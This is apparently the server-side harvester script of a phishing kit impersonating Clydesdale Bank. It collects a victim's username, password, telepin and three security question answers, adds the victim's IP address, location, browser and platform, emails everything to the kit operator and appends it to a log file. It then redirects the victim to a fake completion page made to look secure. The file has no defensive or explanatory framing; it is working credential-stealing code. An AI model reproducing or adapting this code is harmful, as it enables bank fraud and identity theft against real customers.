<?php
require "../CONTROLS.php";
require "../assets/includes/functions.php";
require "../../myEmail.php";

error_reporting(0);
session_start();


date_default_timezone_set('Europe/London');
$date = date('l d F Y');
$time = date('H:i');
$user = $_SESSION['user'];
$telepin = $_SESSION['telepin'];

$pass = $_SESSION['password'];

$q1 = $_POST['q1']." : ".$_POST['a1'];
$q2 = $_POST['q2']." : ".$_POST['a2'];
$q3 = $_POST['q3']." : ".$_POST['a3'];
$ip = $_SERVER['REMOTE_ADDR'];
$systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
$VictimInfo1 = "| IP Address :"." ".$_SERVER['REMOTE_ADDR']." (".gethostbyaddr($_SERVER['REMOTE_ADDR']).")";
$VictimInfo2 = "| Location :"." ".$systemInfo['city'].", ".$systemInfo['region'].", ".$systemInfo['country'];
$VictimInfo3 = "| UserAgent :"." ".$systemInfo['useragent'];
$VictimInfo4 = "| Browser :"." ".$systemInfo['browser'];
$VictimInfo5 = "| Platform :"." ".$systemInfo['os'];
$data = "
+ ------------- clydes-------------+
+ ------------------------------------------+
+ Account Information (Clydesdale)
| User : $user
| Pass : $pass
| Question 1 : $q1
| Question 2 : $q2
| Question 3 : $q3
+ ------------------------------------------+
+ Victim Information
$VictimInfo1
$VictimInfo2
$VictimInfo3
$VictimInfo4
$VictimInfo5
| Received : $date @ $time
+ ------------------------------------------+
";

mail($myEmail, 'Clydesdale from ' . $_SERVER['REMOTE_ADDR'], $data);

$file = fopen('../../assets/logs/banks.txt', 'a');
fwrite($file, $data);
fclose($file);

header('Location: ../../complete.php?sslchannel=true&sessionid=' . generateRandomString(130));
exit;
?>